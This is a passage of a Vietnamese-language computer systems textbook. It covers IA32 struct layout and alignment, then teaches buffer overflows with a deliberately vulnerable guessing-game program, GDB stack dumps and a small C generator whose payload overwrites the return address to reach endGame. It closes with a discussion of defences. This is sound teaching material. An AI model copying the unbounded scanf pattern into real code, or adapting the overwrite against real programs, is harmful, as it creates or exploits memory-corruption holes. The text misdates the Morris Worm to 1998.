<p>Việc chú ý đến <strong>byte offset</strong> (độ lệch tính theo byte) của từng <em>field</em> là chìa khóa để hiểu đoạn code này. Dưới đây là một số điểm cần lưu ý:</p>
<ul>
<li>Lời gọi <code>strncpy</code> nhận ba đối số: địa chỉ cơ sở của <em>field</em> <code>name</code> trong <code>s</code>, địa chỉ của mảng <code>nm</code>, và một giá trị chỉ định độ dài. Hãy nhớ rằng vì <code>name</code> là <em>field</em> đầu tiên trong <code>struct studentT</code>, nên địa chỉ của <code>s</code> cũng chính là địa chỉ của <code>s→name</code>.</li>
</ul>
<pre><code> &lt;+6&gt;:   mov   0x8(%ebp),%eax           # copy tham số 1 (s) vào eax
 &lt;+9&gt;:   mov   0xc(%ebp),%edx           # copy tham số 2 (nm) vào edx
 &lt;+12&gt;:  mov   $0x40,0x8(%esp)          # copy 0x40 (64) vào esp+8
 &lt;+16&gt;:  mov   %edx,0x4(%esp)           # copy nm vào esp+4
 &lt;+20&gt;:  mov   %eax,(%esp)              # copy s lên đỉnh stack (esp)
 &lt;+23&gt;:  call  0x8048320 &lt;strncpy@plt&gt;  # gọi strncpy(s-&gt;name, nm, 64)
</code></pre>
<ul>
<li>Phần tiếp theo của code (các lệnh <code>&lt;initStudent+28&gt;</code> đến <code>&lt;initStudent+35&gt;</code>) đặt giá trị của tham số <code>gr</code> tại vị trí cách đầu <code>s</code> <strong>68 byte</strong>. Xem lại sơ đồ bố trí bộ nhớ trong Hình 1 cho thấy địa chỉ này tương ứng với <code>s→grad_yr</code>.</li>
</ul>
<pre><code> &lt;+28&gt;:  mov   0x8(%ebp),%eax           # copy s vào eax
 &lt;+32&gt;:  mov   0x14(%ebp),%edx          # copy tham số 4 (gr) vào edx
 &lt;+35&gt;:  mov   %edx,0x44(%eax)          # copy gr vào offset eax+68 (s-&gt;grad_yr)
</code></pre>
<ul>
<li>Phần tiếp theo của code (các lệnh <code>&lt;initStudent+38&gt;</code> đến <code>&lt;initStudent+53&gt;</code>) sao chép tham số <code>ag</code> vào <em>field</em> <code>s→age</code>. Sau đó, giá trị của tham số <code>g</code> được sao chép vào <em>field</em> <code>s→gpa</code> (byte offset 72):</li>
</ul>
<pre><code> &lt;+38&gt;:  mov   0x8(%ebp),%eax           # copy s vào eax
 &lt;+41&gt;:  mov   0x10(%ebp),%edx          # copy tham số 3 (ag) vào edx
 &lt;+44&gt;:  mov   %edx,0x40(%eax)          # copy ag vào offset eax+64 (s-&gt;age)
 &lt;+47&gt;:  mov   0x8(%ebp),%edx           # copy s vào edx
 &lt;+50&gt;:  mov   0x18(%ebp),%eax          # copy g vào eax
 &lt;+53&gt;:  mov   %eax,0x48(%edx)          # copy g vào offset edx+72 (s-&gt;gpa)
</code></pre>
<h3 id="891-data-alignment-và-struct"><a class="header" href="#891-data-alignment-và-struct">8.9.1. Data Alignment và struct</a></h3>
<p>Xem xét khai báo <code>struct studentT</code> đã được chỉnh sửa như sau:</p>
<pre><code class="language-c">struct studentTM {
    char name[63]; // cập nhật thành 63 thay vì 64
    int  age;
    int  grad_yr;
    float gpa;
};

struct studentTM student2;
</code></pre>
<p>Kích thước của <em>field</em> <code>name</code> được thay đổi thành 63 byte, thay vì 64 như ban đầu. Hãy xem điều này ảnh hưởng thế nào đến cách <code>struct</code> được bố trí trong bộ nhớ. Có thể bạn sẽ hình dung nó như trong <a href="C8-IA32/structs.html#wrongLayout32">Hình 2</a>:</p>
<p><img src="C8-IA32/_images/struct2wrong.png" alt="struct2wrong" /></p>
<p><strong>Hình 2.</strong> Sơ đồ bố trí bộ nhớ <strong>sai</strong> cho <code>struct studentTM</code> đã chỉnh sửa. Lưu ý rằng <em>field</em> <code>name</code> của struct đã giảm từ 64 xuống 63 byte.</p>
<p>Trong hình minh họa này, <em>field</em> <code>age</code> chiếm ngay byte liền sau <em>field</em> <code>name</code>. Nhưng điều này là <strong>sai</strong>. <a href="C8-IA32/structs.html#correctLayout32">Hình 3</a> mô tả bố trí thực tế trong bộ nhớ:</p>
<p><img src="C8-IA32/_images/struct2right.png" alt="struct2right" /></p>
<p><strong>Hình 3.</strong> Sơ đồ bố trí bộ nhớ <strong>đúng</strong> cho <code>struct studentTM</code> đã chỉnh sửa. Byte x~63~ được <strong>compiler</strong> thêm vào để đáp ứng yêu cầu <strong>memory alignment</strong> (căn chỉnh bộ nhớ), nhưng nó không thuộc về bất kỳ <em>field</em> nào.</p>
<p>Chính sách căn chỉnh của IA32 yêu cầu:</p>
<ul>
<li>Kiểu dữ liệu 2 byte (ví dụ: <code>short</code>) phải nằm tại địa chỉ chia hết cho 2.</li>
<li>Kiểu dữ liệu 4 byte (<code>int</code>, <code>float</code>, <code>long</code>, và các kiểu con trỏ) phải nằm tại địa chỉ chia hết cho 4.</li>
<li>Kiểu dữ liệu 8 byte (<code>double</code>, <code>long long</code>) phải nằm tại địa chỉ chia hết cho 8.</li>
</ul>
<p>Đối với một <code>struct</code>, <strong>compiler</strong> sẽ thêm các byte trống (<strong>padding</strong>) giữa các <em>field</em> để đảm bảo mỗi <em>field</em> đáp ứng yêu cầu căn chỉnh của nó. Ví dụ, trong <code>struct</code> ở đoạn code trên, <strong>compiler</strong> thêm một byte trống tại byte x~63~ để đảm bảo <em>field</em> <code>age</code> bắt đầu tại một địa chỉ chia hết cho 4. Khi dữ liệu được căn chỉnh đúng trong bộ nhớ, CPU có thể đọc hoặc ghi nó chỉ trong một thao tác, giúp tăng hiệu suất.</p>
<p>Xem xét trường hợp khi một <code>struct</code> được định nghĩa như sau:</p>
<pre><code class="language-c">struct studentTM {
    int  age;
    int  grad_yr;
    float gpa;
    char name[63];
};

struct studentTM student3;
</code></pre>
<p>Việc chuyển mảng <code>name</code> xuống cuối sẽ dời byte <strong>padding</strong> về cuối <code>struct</code>, đảm bảo rằng <code>age</code>, <code>grad_yr</code> và <code>gpa</code> đều được căn chỉnh theo 4 byte.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="810-thực-tế-buffer-overflow"><a class="header" href="#810-thực-tế-buffer-overflow">8.10. Thực tế: Buffer Overflow</a></h2>
<p>Ngôn ngữ C không thực hiện việc kiểm tra giới hạn mảng (array bounds checking) một cách tự động.<br />
Việc truy cập bộ nhớ nằm ngoài phạm vi của một mảng là vấn đề nghiêm trọng và thường dẫn đến các lỗi như <strong>segmentation fault</strong>.<br />
Tuy nhiên, một kẻ tấn công tinh vi có thể chèn code độc để cố ý ghi đè ra ngoài biên của mảng (hay còn gọi là <strong>buffer</strong>) nhằm buộc chương trình thực thi theo cách không mong muốn.<br />
Trong trường hợp xấu nhất, kẻ tấn công có thể chạy code cho phép chúng giành được <strong>root privilege</strong> (quyền root) hoặc quyền truy cập cấp hệ điều hành vào hệ thống máy tính.<br />
Một phần mềm khai thác lỗ hổng tràn bộ đệm đã biết trong một chương trình được gọi là <strong>buffer overflow exploit</strong>.</p>
<p>Trong phần này, chúng ta sẽ sử dụng <strong>GDB</strong> và ngôn ngữ assembly để phân tích chi tiết cơ chế của một buffer overflow exploit.<br />
Trước khi đọc chương này, bạn nên tham khảo chương nói về <a href="C8-IA32/../C3-C_debug/gdb_assembly.html#_debugging_assembly_code">GDB để kiểm tra code assembly</a>.</p>
<h3 id="8101-các-ví-dụ-nổi-tiếng-về-buffer-overflow"><a class="header" href="#8101-các-ví-dụ-nổi-tiếng-về-buffer-overflow">8.10.1. Các ví dụ nổi tiếng về Buffer Overflow</a></h3>
<p>Các buffer overflow exploit xuất hiện từ những năm 1980 và vẫn là mối đe dọa lớn của ngành công nghiệp máy tính cho đến đầu những năm 2000.<br />
Mặc dù nhiều hệ điều hành hiện đại đã có cơ chế bảo vệ chống lại các cuộc tấn công buffer overflow đơn giản nhất, nhưng các lỗi lập trình bất cẩn vẫn có thể khiến chương trình hiện đại dễ bị tấn công.<br />
Gần đây, các buffer overflow exploit đã được phát hiện trong <strong>Skype</strong>¹, <strong>Android</strong>², <strong>Google Chrome</strong>³ và nhiều phần mềm khác.</p>
<p>Dưới đây là một số ví dụ lịch sử đáng chú ý:</p>
<p><strong>The Morris Worm</strong><br />
Morris Worm⁴ được phát tán năm 1998 trên ARPANet từ MIT (nhằm che giấu việc nó được viết bởi một sinh viên Cornell) và khai thác lỗ hổng tràn bộ đệm trong <strong>Unix finger daemon</strong> (<code>fingerd</code>).<br />
Trong Linux và các hệ thống tương tự Unix, <strong>daemon</strong> là một loại tiến trình chạy nền liên tục, thường thực hiện các tác vụ dọn dẹp và giám sát.<br />
Daemon <code>fingerd</code> trả về báo cáo thân thiện về một máy tính hoặc người dùng.<br />
Điểm nguy hiểm nhất là con sâu này có cơ chế tự nhân bản, khiến nó được gửi nhiều lần tới cùng một máy tính, làm hệ thống chậm đến mức không thể sử dụng.<br />
Mặc dù tác giả tuyên bố đây chỉ là một thử nghiệm trí tuệ vô hại, nhưng cơ chế nhân bản đã giúp sâu lây lan dễ dàng và khó bị loại bỏ.<br />
Trong những năm sau đó, nhiều loại sâu khác cũng sử dụng buffer overflow exploit để truy cập trái phép vào hệ thống, ví dụ: <strong>Code Red</strong> (2001), <strong>MS-SQLSlammer</strong> (2003) và <strong>W32/Blaster</strong> (2003).</p>
<p><strong>AOL Chat Wars</strong><br />
David Auerbach⁵, cựu kỹ sư Microsoft, kể lại trải nghiệm của mình với một buffer overflow trong quá trình tích hợp <strong>Microsoft Messenger Service (MMS)</strong> với <strong>AOL Instant Messenger (AIM)</strong> vào cuối những năm 1990.<br />
Thời điểm đó, AIM là dịch vụ nhắn tin nhanh phổ biến nhất.<br />
Microsoft muốn chen chân vào thị trường này bằng cách thiết kế tính năng cho phép người dùng MMS trò chuyện với “buddies” trên AIM.<br />
Không hài lòng, AOL đã vá máy chủ để MMS không thể kết nối.<br />
Các kỹ sư Microsoft tìm ra cách để MMS giả lập thông điệp của AIM gửi tới máy chủ AOL, khiến AOL khó phân biệt tin nhắn từ MMS và AIM.<br />
AOL đáp trả bằng cách thay đổi định dạng tin nhắn của AIM, và MMS lại chỉnh sửa để bắt chước.<br />
Cuộc “chiến tranh chat” này tiếp diễn cho đến khi AOL sử dụng một lỗi buffer overflow <strong>ngay trong client của họ</strong> để xác minh tin nhắn đến từ AIM.<br />
Vì MMS không có lỗ hổng này, cuộc chiến kết thúc với phần thắng thuộc về AOL.</p>
<h3 id="8102-cái-nhìn-đầu-tiên-trò-chơi-đoán-số"><a class="header" href="#8102-cái-nhìn-đầu-tiên-trò-chơi-đoán-số">8.10.2. Cái nhìn đầu tiên: Trò chơi đoán số</a></h3>
<p>Để giúp bạn hiểu cơ chế của một cuộc tấn công buffer overflow, chúng tôi cung cấp một file thực thi 32-bit của một chương trình đơn giản cho phép người dùng chơi trò đoán số với máy.<br />
Tải file <code>secret</code> tại <a href="C8-IA32/_attachments/secret.tar.gz">liên kết này</a> và giải nén bằng lệnh:</p>
<pre><code>$ tar -xzvf secret.tar.gz
</code></pre>
<p>Bên dưới là bản sao của <code>main.c</code> (<a href="C8-IA32/_attachments/main.c">main.c</a>), file chính của chương trình:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;other.h&quot; //contains secret function definitions

/*prints out the You Win! message*/
void endGame(void) {
    printf(&quot;You win!\n&quot;);
    exit(0);
}

/*main function of the game*/
int main(void) {

    int guess, secret, len;
    char buf[12]; //buffer (12 bytes long)

    printf(&quot;Enter secret number:\n&quot;);
    scanf(&quot;%s&quot;, buf); //read guess from user input
    guess = atoi(buf); //convert to an integer

    secret = getSecretCode(); //call the getSecretCode() function

    //check to see if guess is correct
    if (guess == secret) {
        printf(&quot;You got it right!\n&quot;);
    }
    else {
        printf(&quot;You are so wrong!\n&quot;);
        return 1; //if incorrect, exit
    }

    printf(&quot;Enter the secret string to win:\n&quot;);
    scanf(&quot;%s&quot;, buf); //get secret string from user input

    guess = calculateValue(buf, strlen(buf)); //call calculateValue function

    //check to see if guess is correct
    if (guess != secret){
        printf(&quot;You lose!\n&quot;);
        return 2; //if guess is wrong, exit
    }

    /*if both the secret string and number are correct
    call endGame()*/
    endGame();

    return 0;
}
</code></pre>
<p>Chương trình này yêu cầu người dùng nhập một số bí mật và sau đó là một chuỗi bí mật để thắng trò chơi.<br />
File header <code>other.h</code> chứa định nghĩa của các hàm <code>getSecretCode</code> và <code>calculateValue</code>, nhưng chúng ta không có file này.<br />
Vậy làm sao để thắng trò chơi?<br />
Thử brute force sẽ mất quá nhiều thời gian.<br />
Một chiến lược là phân tích file thực thi <code>secret</code> trong GDB và bước qua code assembly để tìm ra số và chuỗi bí mật.<br />
Quá trình phân tích code assembly để hiểu cách nó hoạt động được gọi là <strong>reverse engineering</strong>.<br />
Những người thành thạo GDB và đọc assembly có thể dùng GDB để reverse engineer số và chuỗi bí mật.</p>
<p>Tuy nhiên, vẫn còn một cách khác tinh vi hơn để chiến thắng.</p>
<h3 id="8103-xem-xét-kỹ-hơn-under-the-c"><a class="header" href="#8103-xem-xét-kỹ-hơn-under-the-c">8.10.3. Xem xét kỹ hơn (Under the C)</a></h3>
<p>Chương trình có khả năng chứa lỗ hổng tràn bộ đệm tại lần gọi <code>scanf</code> đầu tiên.<br />
Để hiểu chuyện gì đang xảy ra, hãy kiểm tra code assembly của hàm <code>main</code> bằng GDB.<br />
Chúng ta sẽ đặt breakpoint tại địa chỉ <code>0x0804859f</code>, là lệnh ngay trước khi gọi <code>scanf</code> (nếu đặt breakpoint tại địa chỉ của <code>scanf</code>, chương trình sẽ dừng <strong>bên trong</strong> <code>scanf</code>, chứ không phải trong <code>main</code>).</p>
<pre><code>   0x08048582 &lt;+0&gt;:     push   %ebp
   0x08048583 &lt;+1&gt;:     mov    %esp,%ebp
   0x08048588 &lt;+6&gt;:     sub    $0x38,%esp
   0x0804858b &lt;+9&gt;:     movl   $0x8048707,(%esp)
   0x08048592 &lt;+16&gt;:    call   0x8048390 &lt;printf@plt&gt;
   0x08048597 &lt;+21&gt;:    lea    0x1c(%esp),%eax
   0x0804859b &lt;+25&gt;:    mov    %eax,0x4(%esp)
=&gt; 0x0804859f &lt;+29&gt;:    movl   $0x804871c,(%esp)
   0x080485a6 &lt;+36&gt;:    call   0x80483e0 &lt;scanf@plt&gt;
</code></pre>
<p><strong>Hình 1</strong> mô tả stack ngay trước khi gọi <code>scanf</code>:</p>
<p><img src="C8-IA32/_images/beforeScanf.png" alt="before" /><br />
<strong>Hình 1.</strong> Call stack ngay trước khi gọi <code>scanf</code></p>
<p>Trước khi gọi <code>scanf</code>, các tham số của nó được nạp sẵn vào stack, với tham số thứ nhất ở đỉnh stack và tham số thứ hai ở ngay dưới.<br />
Lệnh <code>lea</code> tại <code>&lt;main+21&gt;</code> tạo địa chỉ tham chiếu cho mảng <code>buf</code>.</p>
<p>Giả sử người dùng nhập <code>12345678</code> tại prompt.<br />
<strong>[afterScanf]</strong> minh họa stack ngay sau khi <code>scanf</code> hoàn tất:</p>
<p><img src="C8-IA32/_images/afterScanf.png" alt="after" /><br />
<strong>Hình 2.</strong> Call stack ngay sau khi gọi <code>scanf</code> với input <code>12345678</code></p>
<p>Hãy nhớ rằng code hex của các ký tự số từ <code>'0'</code> đến <code>'9'</code> là từ <code>0x30</code> đến <code>0x39</code>, và mỗi ô nhớ trên stack dài 4 byte.<br />
Frame pointer cách stack pointer 56 byte.<br />
Bạn có thể xác nhận giá trị của <code>%ebp</code> bằng GDB với lệnh:</p>
<pre><code>p $ebp
</code></pre>
<p>Trong ví dụ này, <code>%ebp</code> có giá trị <code>0xffffd428</code>.<br />
Lệnh sau cho phép xem 64 byte (dạng hex) bên dưới <code>%esp</code>:</p>
<pre><code>(gdb) x /64bx $esp
</code></pre>
<p>Lệnh này sẽ cho kết quả tương tự như sau:</p>
<pre><code>0xffffd3f0:     0x1c    0x87    0x04    0x08    0x0c    0xd4    0xff    0xff
0xffffd3f8:     0x00    0xa0    0x04    0x08    0xb2    0x86    0x04    0x08
0xffffd400:     0x01    0x00    0x00    0x00    0xc4    0xd4    0xff    0xff
0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34
0xffffd410:     0x35    0x36    0x37    0x38    0x00    0x80    0x00    0x00
0xffffd418:     0x6b    0x86    0x04    0x08    0x00    0x80    0xfb    0xf7
0xffffd420:     0x60    0x86    0x04    0x08    0x00    0x00    0x00    0x00
0xffffd428:     0x00    0x00    0x00    0x00    0x43    0x5a    0xe1    0xf7
</code></pre>
<p>Mỗi dòng trong kết quả hiển thị đại diện cho hai từ 32-bit. Vì vậy, dòng đầu tiên biểu diễn các từ tại địa chỉ <code>0xffffd3f0</code> và <code>0xffffd3f4</code>. Nhìn vào đỉnh của stack, ta có thể thấy địa chỉ bộ nhớ trỏ tới chuỗi <code>&quot;%s&quot;</code> (hay <code>0x0804871c</code>), theo sau là địa chỉ của <code>buf</code> (hay <code>0xffffd40c</code>). Lưu ý rằng trong các hình minh họa của phần này, địa chỉ của <code>buf</code> được rút gọn thành <code>0x40c</code>.</p>
<div class="table-wrapper"><table><thead><tr><th></th><th></th></tr></thead><tbody>
<tr><td></td><td><strong>Các giá trị nhiều byte (multibyte) được lưu theo thứ tự little-endian</strong></td></tr>
<tr><td></td><td>&gt; Trong đoạn assembly trước đó, byte tại địa chỉ <code>0xfffffd3f0</code> là <code>0x1c</code>, byte tại <code>0xfffffd3f1</code> là <code>0x87</code>, byte tại <code>0xfffffd3f2</code> là <code>0x04</code>, và byte tại <code>0xfffffd3f3</code> là <code>0x08</code>. Tuy nhiên, <em>giá trị</em> 32-bit (tương ứng với địa chỉ bộ nhớ của chuỗi <code>&quot;%s&quot;</code>) tại địa chỉ <code>0xfffffd3f0</code> thực chất là <code>0x0804871c</code>. Hãy nhớ rằng vì x86 là hệ thống <a href="C8-IA32/../C4-Binary/byte_order.html#_integer_byte_order">little-endian</a>, các byte của giá trị nhiều byte như địa chỉ sẽ được lưu theo thứ tự đảo ngược. Tương tự, các byte tương ứng với địa chỉ của mảng <code>buf</code> (<code>0xffffd40c</code>) cũng được lưu theo thứ tự đảo ngược tại địa chỉ <code>0xfffffd3f4</code>.</td></tr>
</tbody></table>
</div>
<p>Các byte liên quan đến địa chỉ <code>0xffffd40c</code> nằm trên cùng một dòng với các byte tại địa chỉ <code>0xffffd408</code>, và là từ thứ hai trên dòng đó. Vì mảng <code>buf</code> dài 12 byte, các phần tử của <code>buf</code> chiếm 12 byte từ địa chỉ <code>0xffffd40c</code> đến <code>0xffffd417</code>. Kiểm tra các byte tại những địa chỉ này cho kết quả:</p>
<pre><code>0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34
0xffffd410:     0x35    0x36    0x37    0x38    0x00    0x80    0x00    0x00
</code></pre>
<p>Tại đây, ta có thể thấy rõ biểu diễn hex của chuỗi nhập <code>12345678</code>. Byte kết thúc null <code>\0</code> xuất hiện ở vị trí byte ngoài cùng bên trái tại địa chỉ <code>0xffffd414</code>. Hãy nhớ rằng <code>scanf</code> sẽ kết thúc tất cả các chuỗi bằng một byte null.</p>
<p>Tất nhiên, <code>12345678</code> không phải là số bí mật. Đây là kết quả khi chạy <code>secret</code> với chuỗi nhập <code>12345678</code>:</p>
<pre><code>$ ./secret
Enter secret number:
12345678
You are so wrong!
$ echo $?
1
</code></pre>
<p>Lệnh <code>echo $?</code> in ra giá trị trả về của lệnh vừa chạy trong shell. Trong trường hợp này, chương trình trả về <code>1</code> vì số bí mật nhập vào sai. Theo quy ước, chương trình trả về <code>0</code> khi không có lỗi. Mục tiêu tiếp theo của chúng ta là tìm cách khiến chương trình thoát với giá trị trả về <code>0</code>, nghĩa là chúng ta thắng trò chơi.</p>
<h3 id="8104-buffer-overflow-lần-thử-đầu-tiên"><a class="header" href="#8104-buffer-overflow-lần-thử-đầu-tiên">8.10.4. Buffer Overflow: Lần thử đầu tiên</a></h3>
<p>Tiếp theo, hãy thử nhập chuỗi:</p>
<pre><code>1234567890123456789012345678901234
</code></pre>
<p>Kết quả:</p>
<pre><code>$ ./secret
Enter secret number:
1234567890123456789012345678901234
You are so wrong!
Segmentation fault (core dumped)
$ echo $?
139
</code></pre>
<p>Thú vị đấy! Lần này chương trình bị crash với lỗi segmentation fault, code trả về <code>139</code>. <strong>Hình 3</strong> cho thấy call stack của <code>main</code> ngay sau khi gọi <code>scanf</code> với chuỗi nhập mới này:</p>
<p><img src="C8-IA32/_images/afterScanf2.png" alt="after2" /><br />
<strong>Hình 3.</strong> Call stack ngay sau khi gọi <code>scanf</code> với input <code>1234567890123456789012345678901234</code></p>
<p>Chuỗi nhập quá dài này không chỉ ghi đè giá trị tại địa chỉ <code>0x428</code>, mà còn tràn xuống ghi đè cả địa chỉ trả về (return address) bên dưới stack frame của <code>main</code>. Hãy nhớ rằng khi một hàm trả về, chương trình sẽ cố tiếp tục thực thi tại địa chỉ được lưu trong return address. Trong ví dụ này, chương trình cố chạy tiếp tại địa chỉ <code>0xf7003433</code> sau khi thoát <code>main</code>, nhưng địa chỉ này không tồn tại. Do đó, chương trình crash với segmentation fault.</p>
<p>Chạy lại chương trình trong GDB (<code>input.txt</code> chứa chuỗi nhập ở trên) sẽ cho thấy điều này rõ ràng:</p>
<pre><code>$ gdb secret
(gdb) break *0x804859b
(gdb) ni
(gdb) run &lt; input.txt
(gdb) x /64bx $esp
0xffffd3f0:     0x1c    0x87    0x04    0x08    0x0c    0xd4    0xff    0xff
0xffffd3f8:     0x00    0xa0    0x04    0x08    0xb2    0x86    0x04    0x08
0xffffd400:     0x01    0x00    0x00    0x00    0xc4    0xd4    0xff    0xff
0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34
0xffffd410:     0x35    0x36    0x37    0x38    0x39    0x30    0x31    0x32
0xffffd418:     0x33    0x34    0x35    0x36    0x37    0x38    0x39    0x30
0xffffd420:     0x31    0x32    0x33    0x34    0x35    0x36    0x37    0x38
0xffffd428:     0x39    0x30    0x31    0x32    0x33    0x34    0x00    0xf7
</code></pre>
<p>Có thể thấy chuỗi nhập đã vượt quá giới hạn của mảng <code>buf</code>, ghi đè lên tất cả các giá trị khác trên stack. Nói cách khác, chuỗi này đã tạo ra một <strong>buffer overrun</strong> và làm hỏng call stack, khiến chương trình crash. Quá trình này còn được gọi là <strong>smashing the stack</strong>.</p>
<h3 id="8105-buffer-overflow-thông-minh-hơn-lần-thử-thứ-hai"><a class="header" href="#8105-buffer-overflow-thông-minh-hơn-lần-thử-thứ-hai">8.10.5. Buffer Overflow thông minh hơn: Lần thử thứ hai</a></h3>
<p>Trong ví dụ đầu tiên, chúng ta đã “đập nát” stack bằng cách ghi đè thanh ghi <code>%ebp</code> và địa chỉ trả về bằng dữ liệu rác, khiến chương trình crash. Một kẻ tấn công chỉ muốn làm chương trình sập thì đến đây đã hài lòng. Tuy nhiên, mục tiêu của chúng ta là đánh lừa trò chơi đoán số để nó trả về <code>0</code>, nghĩa là chúng ta thắng. Ta có thể làm điều này bằng cách ghi đè stack bằng dữ liệu có ý nghĩa hơn là rác. Ví dụ: ta có thể thay địa chỉ trả về bằng địa chỉ của hàm <code>endGame</code>. Khi chương trình cố trả về từ <code>main</code>, nó sẽ chạy <code>endGame</code> thay vì crash với segmentation fault.</p>
<p>Để tìm địa chỉ của <code>endGame</code>, hãy mở lại <code>secret</code> trong GDB:</p>
<pre><code>$ gdb secret
(gdb) disas endGame
Dump of assembler code for function endGame:
    0x08048564 &lt;+0&gt;:     push   %ebp
    0x08048565 &lt;+1&gt;:     mov    %esp,%ebp
    0x08048567 &lt;+3&gt;:     sub    $0x18,%esp
    0x0804856a &lt;+6&gt;:     movl   $0x80486fe,(%esp)
    0x08048571 &lt;+13&gt;:    call   0x8048390 &lt;puts@plt&gt;
    0x08048576 &lt;+18&gt;:    movl   $0x0,(%esp)
    0x0804857d &lt;+25&gt;:    call   0x80483b0 &lt;exit@plt&gt;
End of assembler dump.
</code></pre>
<p>Một lần nữa, vì x86 là hệ thống <a href="C8-IA32/../C4-Binary/byte_order.html#_integer_byte_order">little-endian</a> trong đó stack phát triển về phía địa chỉ thấp hơn, nên các byte trong địa chỉ trả về sẽ xuất hiện theo thứ tự đảo ngược.</p>
<p>Chương trình dưới đây minh họa cách một kẻ tấn công có thể tạo ra exploit như trên:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

char ebuff[]=
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30&quot; /* 10 byte rác đầu tiên */
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30&quot; /* 10 byte rác tiếp theo */
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30&quot; /* 10 byte rác tiếp theo nữa */
&quot;\x31\x32&quot;                                 /* 2 byte rác cuối */
&quot;\x64\x85\x04\x08&quot;                         /* địa chỉ của endGame (little-endian) */
;

int main(void) {
    int i;
    for (i = 0; i &lt; sizeof(ebuff); i++) { /* in từng ký tự */
        printf(&quot;%c&quot;, ebuff[i]);
    }
    return 0;
}
</code></pre>
<p>Ký tự <code>\x</code> trước mỗi số cho biết số đó được biểu diễn ở dạng giá trị thập lục phân của một ký tự. Sau khi định nghĩa <code>ebuff[]</code>, hàm <code>main</code> chỉ đơn giản in ra từng ký tự một.<br />
Để tạo chuỗi byte tương ứng, biên dịch và chạy chương trình như sau:</p>
<pre><code>$ gcc -o genEx genEx.c
$ ./genEx &gt; exploit
</code></pre>
<p>Để dùng file <code>exploit</code> làm input cho <code>scanf</code>, chỉ cần chạy <code>secret</code> với <code>exploit</code> như sau:</p>
<pre><code>$ ./secret &lt; exploit
Enter secret number:
You are so wrong!
You win!
</code></pre>
<p>Chương trình in ra <code>&quot;You are so wrong!&quot;</code> vì chuỗi trong <code>exploit</code> <strong>không</strong> phải là số bí mật. Tuy nhiên, chương trình cũng in <code>&quot;You win!&quot;</code>.<br />
Hãy nhớ rằng mục tiêu của chúng ta là đánh lừa chương trình trả về <code>0</code>. Trong một hệ thống lớn hơn, nơi trạng thái “thành công” được theo dõi bởi một chương trình bên ngoài, điều quan trọng nhất thường là giá trị trả về của chương trình, chứ không phải những gì nó in ra.</p>
<p>Kiểm tra giá trị trả về:</p>
<pre><code>$ echo $?
0
</code></pre>
<p>Exploit của chúng ta đã thành công! Chúng ta đã thắng trò chơi.</p>
<h3 id="8106-bảo-vệ-chống-lại-buffer-overflow"><a class="header" href="#8106-bảo-vệ-chống-lại-buffer-overflow">8.10.6. Bảo vệ chống lại Buffer Overflow</a></h3>
<p>Ví dụ trên đã thay đổi luồng điều khiển của file thực thi <code>secret</code>, buộc nó trả về giá trị 0 (thành công). Tuy nhiên, một exploit như vậy có thể gây ra thiệt hại thực sự.<br />
Hơn nữa, một số hệ thống máy tính cũ <strong>thực thi</strong> các byte từ bộ nhớ stack. Nếu kẻ tấn công đặt các byte tương ứng với lệnh assembly lên call stack, CPU sẽ diễn giải chúng như các lệnh <strong>thật</strong>, cho phép kẻ tấn công buộc CPU thực thi <strong>bất kỳ code tùy ý nào</strong>.</p>
<p>May mắn thay, các hệ thống hiện đại có nhiều chiến lược để làm cho việc khai thác buffer overflow trở nên khó khăn hơn:</p>
<ul>
<li>
<p><strong>Stack Randomization</strong>: Hệ điều hành cấp phát địa chỉ bắt đầu của stack tại một vị trí ngẫu nhiên trong bộ nhớ stack, khiến vị trí/kích thước của call stack thay đổi giữa các lần chạy. Nhiều máy chạy cùng một chương trình sẽ có địa chỉ stack khác nhau. Linux hiện đại dùng kỹ thuật này như một tiêu chuẩn. Tuy nhiên, kẻ tấn công kiên trì vẫn có thể brute force bằng cách thử nhiều địa chỉ khác nhau. Một mẹo phổ biến là dùng <strong>NOP sled</strong> — một dãy dài các lệnh <code>nop</code> (<code>0x90</code>) trước code exploit. Lệnh <code>nop</code> không làm gì ngoài việc tăng program counter sang lệnh tiếp theo. Miễn là CPU bắt đầu thực thi ở đâu đó trong NOP sled, nó sẽ trượt đến đoạn code exploit phía sau. Bài viết <em>Smashing the Stack for Fun and Profit</em> của Aleph One⁶ mô tả chi tiết cơ chế này.</p>
</li>
<li>
<p><strong>Stack corruption detection</strong>: Một biện pháp khác là phát hiện khi stack bị hỏng. Các phiên bản GCC gần đây dùng một cơ chế bảo vệ gọi là <strong>canary</strong> — một giá trị đóng vai trò như “chim hoàng yến” canh gác giữa buffer và các phần tử khác của stack. Canary được lưu ở vùng bộ nhớ không ghi đè được và được so sánh với giá trị đặt trên stack. Nếu canary “chết” trong quá trình chạy, chương trình biết mình đang bị tấn công và sẽ dừng với thông báo lỗi. Tuy nhiên, kẻ tấn công tinh vi có thể thay thế canary để tránh bị phát hiện.</p>
</li>
<li>
<p><strong>Giới hạn vùng có thể thực thi</strong>: Ở biện pháp này, code thực thi chỉ được phép nằm trong một số vùng bộ nhớ nhất định, nghĩa là call stack không còn khả năng thực thi. Tuy nhiên, biện pháp này cũng có thể bị vượt qua. Trong tấn công <strong>return-oriented programming</strong> (ROP), kẻ tấn công có thể “nhặt” các lệnh trong vùng thực thi và nhảy từ lệnh này sang lệnh khác để tạo thành exploit. Có nhiều ví dụ nổi tiếng về kỹ thuật này, đặc biệt trong các trò chơi điện tử⁷.</p>
</li>
</ul>
<p>Tuy nhiên, tuyến phòng thủ tốt nhất vẫn là lập trình viên.<br />
Để ngăn chặn buffer overflow trong chương trình của bạn, hãy dùng các hàm C có <strong>length specifier</strong> bất cứ khi nào có thể và thêm code kiểm tra giới hạn mảng. Điều quan trọng là các mảng được khai báo phải khớp với length specifier đã chọn.</p>
<p><strong>Bảng 1</strong> liệt kê một số hàm C “xấu” dễ bị buffer overflow và hàm “tốt” nên dùng thay thế (giả sử <code>buf</code> được cấp phát 12 byte):</p>
